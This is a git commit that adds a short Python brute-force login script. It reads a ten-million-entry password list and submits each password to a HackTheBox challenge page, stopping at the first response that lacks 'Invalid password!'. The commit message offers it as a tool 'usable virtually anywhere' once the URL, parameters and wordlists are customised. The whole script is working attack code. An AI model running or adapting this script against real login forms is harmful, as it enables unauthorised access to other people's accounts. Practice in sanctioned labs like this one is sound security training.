1a86b035c3d47d4cd5e375f0dd67b860f02197e6
evanlutz725 <36962977+evanlutz725@users.noreply.github.com>
2019-03-11 00:10:34 -0500

    Username and Password Brute Forcing Tool
    This tool is usable virtually anywhere. These scripts need customizing to the specific urls, parameters sent to the server, text files of usernames and passwords, and expected outputs for failed attempts, given as a string. This tool was created with the Requests library in python.

---
+++ Brute_Force_Login_Tool.py
@@ -0,0 +1,23 @@
+#This is a python password testing tool for a specific use case written by Evan Lutz.
+
+
+#requests library is for initiating HTTP methods in python
+import requests
+#this is a dictionary attack that tests 10 million common passwords.
+f = open('10milpwlist.txt','r')
+#a counter is added to know where I am in this list and how many passwords have been tested so far.
+count = 1
+#the file is formatted with one password per line.
+for line in f:
+	#this website only has a password parameter to test. If I was to use a username and password,
+	#I would utlize a second username file and a nested loop, with an additional dictionary entry
+	#of 'username':str(user), based on the line item variable assigned for the usernames.
+	r = requests.post('http://docker.hackthebox.eu:34224/', data={'password':str(line),'submit':'Submit'})
+	#this is unique to this particular webpage and the returned html starts with 'Invalid password!'
+	#so should I find a successful password, the inclination is to believe that it wouldn't contain that string.
+	if 'Invalid password!' not in r.text:
+		print ('The password is ' + line)
+		break
+	else:
+		print (str(count) + ' incorrect passwords attempted.')
+	count += 1
